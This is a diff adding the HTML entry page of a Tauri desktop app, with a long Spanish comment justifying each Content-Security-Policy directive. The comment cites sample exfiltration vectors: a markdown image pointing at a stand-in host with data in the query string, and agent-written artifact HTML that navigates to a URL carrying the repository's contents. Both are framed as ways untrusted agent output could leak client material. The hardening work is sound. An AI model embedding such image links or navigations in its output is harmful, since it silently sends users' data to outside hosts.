@@ -1,0 +1,79 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <!-- La política de la ventana, y **el mismo texto que `tauri.conf.json`**:
+         `scripts/csp.mjs` falla si los dos dejan de coincidir. Hacen falta los
+         dos sitios porque gobiernan momentos distintos — en desarrollo la ventana
+         carga del servidor de Vite y Tauri no llega a poner su cabecera, así que
+         ahí este `<meta>` es la única política que hay.
+
+         Existe porque el chat pinta lo que escribió un agente sobre material del
+         cliente, que no es de confianza. Sin ella, un `![](http://ajeno/?d=…)` en
+         la respuesta dispara el GET **al pintarse, sin un clic**, y eso es
+         material saliendo de la máquina por una vía que no es ninguna de las
+         cinco de `ARCHITECTURE.md` § 7: sin sello y sin rastro. Medido, y vuelto
+         a medir después de cerrarlo: `attacks/window.mjs`.
+
+         Cada permiso, y por qué está:
+
+         · `script-src 'self'`     sin `'unsafe-inline'` y sin `'unsafe-eval'`:
+                                   cierra los manejadores en atributo y `eval`.
+         · `script-src-elem` con inline
+                                   **la concesión cara, y no es por comodidad.** Un
+                                   marco `srcdoc` HEREDA esta política, y el
+                                   contenedor de artefactos está diseñado para
+                                   correr el JavaScript del agente dentro. Medido:
+                                   con `script-src 'self'` a secas, el runtime del
+                                   artefacto no arranca — *«Refused to execute a
+                                   script…»* en los dos motores— y la vista previa
+                                   se queda muerta. Separarlo en `-elem` deja lo
+                                   otro cerrado. Lo que cuesta: un `javascript:`
+                                   ejecutaría si algo lo pintara, y eso lo cierra
+                                   el filtro de `lib/links.ts` — la política
+                                   sigue matando su `fetch`, pero no su acceso a
+                                   `__TAURI_INTERNALS__`. Está medido en
+                                   `attacks/window.mjs`, corrida «SOLO LA POLÍTICA».
+         · `style-src` con inline  Vite y Tailwind inyectan `<style>` al vuelo en
+                                   desarrollo, y el contenedor también lo hereda.
+                                   Un CSS inyectado no saca nada con `img-src`,
+                                   `font-src` y `connect-src` cerrados.
+         · `img-src`, `font-src` y `media-src` con `data:`
+                                   `data:` es la vista previa de imagen que arma
+                                   `preview.rs`, la imagen embebida en un mensaje y
+                                   lo que el artefacto lleva dentro —que hereda de
+                                   aquí—. Ninguna pide red.
+         · `connect-src` con `ipc:` y `http://ipc.localhost`
+                                   el IPC de Tauri viaja por `fetch()` a esa URL
+                                   (`scripts/ipc-protocol.js`); son dos por
+                                   plataforma, no dos por si acaso. Sin ellas cada
+                                   `invoke` falla y cae a `postMessage`.
+         · `frame-src 'self'`      el tercer candado del contenedor de artefactos:
+                                   gobierna a dónde puede navegar un marco hijo.
+                                   Sin esto el HTML del agente hace
+                                   `location.href = "http://…/?" + contenido` y se
+                                   lleva el repo por la URL. Ni el atributo
+                                   `sandbox` ni la política del propio documento
+                                   alcanzan ese caso: un marco siempre puede
+                                   navegarse a sí mismo. Ver `attacks/README.md`.
+         · `base-uri` y `form-action` en `'none'`
+                                   no heredan de `default-src`, así que quedarían
+                                   abiertas. Los cinco formularios de la app llaman
+                                   a `preventDefault()`.
+
+         Lo que esta política **no** gobierna: la navegación de la ventana. Un
+         `<a href="http://…">` se lleva la app entera y ninguna directiva lo para
+         — eso lo cierra `ui/Markdown.tsx` mandando el destino al navegador del
+         sistema. -->
+    <meta
+      http-equiv="Content-Security-Policy"
+      content="default-src 'self'; script-src 'self'; script-src-elem 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: terminus-image: http://terminus-image.localhost; font-src 'self' data:; media-src 'self' data:; connect-src 'self' ipc: http://ipc.localhost; frame-src 'self'; object-src 'none'; base-uri 'none'; form-action 'none'"
+    />
+    <title>Terminus</title>
+  </head>
+  <body>
+    <div id="root"></div>
+    <script type="module" src="/src/app/main.tsx"></script>
+  </body>
+</html>
